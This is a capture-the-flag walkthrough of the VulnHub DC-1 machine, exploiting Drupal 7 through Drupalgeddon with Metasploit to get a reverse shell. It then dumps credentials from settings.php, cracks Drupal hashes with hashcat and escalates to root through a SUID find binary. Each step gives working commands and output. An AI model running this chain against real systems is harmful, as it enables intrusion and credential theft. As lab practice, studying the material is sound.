DC-1 is an Easy Linux box from **VulnHub** (another one from my self-hosted eJPTv2 prep lab), built around an outdated **Drupal 7** CMS. The foothold is the famous **Drupalgeddon** SQL-injection RCE (**CVE-2014-3704**) for a `www-data` shell. From there the box is a guided tour of post-exploitation: the Drupal config file leaks the database password, the `users` table gives up password hashes that **hashcat** cracks, and the admin login reveals the privilege-escalation hint — a **SUID `find`** binary that drops straight to `root` via GTFOBins. The flags themselves are deliberate hints, so I've redacted their text and described where each one points.

## Reconnaissance & Enumeration

### Port Scan

```bash
sudo nmap -p- -sCV 192.168.57.4 -oN nmap
```

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp   open  rpcbind 2-4 (RPC #100000)
```

Three services, and the web server announces itself loudly: **Drupal 7** on Apache 2.2.22. `whatweb` adds the detail that pins the version era — PHP 5.4.45:

```bash
whatweb http://192.168.57.4/
# Drupal, HTTPServer[Debian], PHP[5.4.45-0+deb7u14], MetaGenerator[Drupal 7]
```

### Fingerprinting Drupal with droopescan

`droopescan` is the Drupal/SilverStripe/WordPress equivalent of `wpscan` — it enumerates the exact version range and the installed modules:

```bash
droopescan scan drupal -u http://192.168.57.4
```

```bash
[+] Plugins found: ctools, views, profile, php, image
[+] Possible version(s): 7.22 - 7.26
[+] Possible interesting urls found:
    Default admin - http://192.168.57.4/user/login
```

Drupal **7.22–7.26** is squarely inside the range vulnerable to **Drupalgeddon** (CVE-2014-3704) — a pre-authentication SQL injection in the Database API that can be leveraged into PHP code execution. That's the foothold.

## Initial Access — CVE-2014-3704 (Drupalgeddon) as `www-data`

Metasploit's `drupal_drupageddon` module automates the whole chain: it abuses the SQLi to inject into Drupal's form cache and execute a PHP payload. The defaults fit (target port 80, URI `/`); it just needs the target and a listener:

```bash
msf6 > use exploit/multi/http/drupal_drupageddon
msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 192.168.57.4
msf6 exploit(multi/http/drupal_drupageddon) > set LHOST 192.168.57.1
msf6 exploit(multi/http/drupal_drupageddon) > run
```

```bash
[*] Started reverse TCP handler on 192.168.57.1:4444
[*] Sending stage (45739 bytes) to 192.168.57.4
[*] Meterpreter session 1 opened (192.168.57.1:4444 -> 192.168.57.4:59448)

meterpreter > getuid
Server username: www-data
```

A `www-data` shell. The webroot already holds **flag1**, which — without quoting it — is a nudge straight at Drupal's configuration file. That's the next stop.

## Looting — Config Credentials & Hash Cracking

### The Drupal config file

Drupal keeps its settings (including database credentials, in cleartext) in `sites/default/settings.php`. It also holds **flag2**, whose comment points at *using* those credentials rather than brute-forcing anything:

```bash
www-data@DC-1:/var/www/sites/default$ cat settings.php
```

```php
$databases = array('default' => array('default' => array(
  'database' => 'drupaldb',
  'username' => 'dbuser',
  'password' => 'R0ck3t',
  'driver'   => 'mysql',
)));
```

So the database login is **`dbuser:R0ck3t`**.

### Dumping and cracking the user hashes

MySQL is listening only on localhost (`127.0.0.1:3306`), but we're already on the box. Reading the `users` table dumps Drupal's stored password hashes for `admin` and `Fred`:

```bash
mysql -u dbuser -p'R0ck3t' drupaldb -e "select name,pass from users"
```

```bash
admin  $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
Fred   $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg
```

The `$S$` prefix is Drupal 7's hashing scheme — hashcat mode **7900**. Against `rockyou`, both fall quickly:

```bash
hashcat -m 7900 hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
$S$DvQI6Y...:53cr3t
$S$DWGrx...:MyPassword
```

That gives **`admin:53cr3t`** and **`Fred:MyPassword`**. Logging into Drupal as `admin` reveals **flag3** in the site content, which (again, paraphrased) points the way to the privilege escalation: a SUID binary and the `-exec` trick to read protected files.

## Privilege Escalation — `www-data` → `root` (SUID `find`)

Following that hint, a search for SUID binaries confirms the vector:

```bash
www-data@DC-1:/$ find / -perm -4000 2>/dev/null
/bin/mount
/bin/su
/usr/bin/passwd
...
/usr/bin/find
```

**`/usr/bin/find` carries the SUID bit** — it runs as its owner, `root`. `find` can execute arbitrary commands with `-exec`, so a SUID `find` is a direct root shell. This is the exact [GTFOBins](https://gtfobins.github.io/gtfobins/find/) technique: `find` spawns `/bin/sh`, which inherits `find`'s root privileges:

```bash
www-data@DC-1:/$ find . -exec /bin/sh \; -quit
# whoami
root
# cat /root/thefinalflag.txt
REDACTED
```

Full root, and the final flag. (There's also a `flag4` under `/home/flag4/` whose hint foreshadows exactly this SUID-`find`-to-root step.)

## Key Takeaways

- **An unpatched CMS version is the whole foothold.** `droopescan` placed Drupal in the 7.22–7.26 range, which maps directly to Drupalgeddon (CVE-2014-3704). Fingerprinting the exact version is often the entire exploitation decision on a CMS box.
- **Config files are credential stores.** `settings.php` handed over `dbuser:R0ck3t` in cleartext — and that one reused-style password unlocked the database, the user hashes, and ultimately the Drupal admin account. After any web foothold, read the app's config before anything heavier.
- **Hash the scheme correctly.** The `$S$` prefix is Drupal 7 (hashcat 7900); picking the right mode is the difference between a 10-second crack and a dead end. `admin:53cr3t` fell instantly against rockyou.
- **SUID on `find` is an instant root shell.** `find` with `-exec` runs arbitrary commands, so the SUID bit makes `find . -exec /bin/sh \; -quit` a one-line privesc. Audit SUID binaries (`find / -perm -4000`) and strip the bit from anything that can execute commands.
- **Read the challenge's own hints.** DC-1's flags are a guided path — config file → credentials → hashes → SUID find. Even on a real target, the box author's intended route mirrors a sensible methodology: enumerate, loot config, escalate via misconfiguration.
